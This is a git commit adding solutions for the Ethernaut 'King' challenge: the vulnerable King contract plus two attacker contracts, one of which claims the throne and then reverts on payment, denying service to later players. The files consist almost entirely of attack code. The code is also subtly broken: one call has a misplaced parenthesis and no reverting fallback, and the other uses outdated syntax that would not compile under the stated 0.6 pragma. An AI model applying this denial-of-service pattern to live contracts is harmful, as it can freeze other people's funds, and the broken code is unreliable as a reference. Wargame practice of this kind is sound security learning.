9b40200449ef7081a1768e0a1dca907daa6a9593
JaeseungJung <86044304+JaeseungJung@users.noreply.github.com>
2021-08-12 20:20:05 +0900

    [UPDATE]

---
+++ ethernaut/king.sol
@@ -0,0 +1,33 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract King {
+
+  address payable king;
+  uint public prize;
+  address payable public owner;
+
+  constructor() public payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address payable) {
+    return king;
+  }
+}
+
+contract attakKing {
+    function attack(address _addr) external payable {
+        (bool success, ) = payable(address(_addr).call{value: msg.value}(""));
+        require(success,"external call failed");
+    }
+} 
---
+++ ethernaut/king2.sol
@@ -0,0 +1,37 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract King {
+
+  address payable king;
+  uint public prize;
+  address payable public owner;
+
+  constructor() public payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address payable) {
+    return king;
+  }
+}
+
+
+contract Conqueror {
+    function Conqueror() public {}
+    function victory(address _king) public payable {
+        _king.call.value(msg.value)();
+    }
+    function() public payable {
+        revert();
+    }
+}
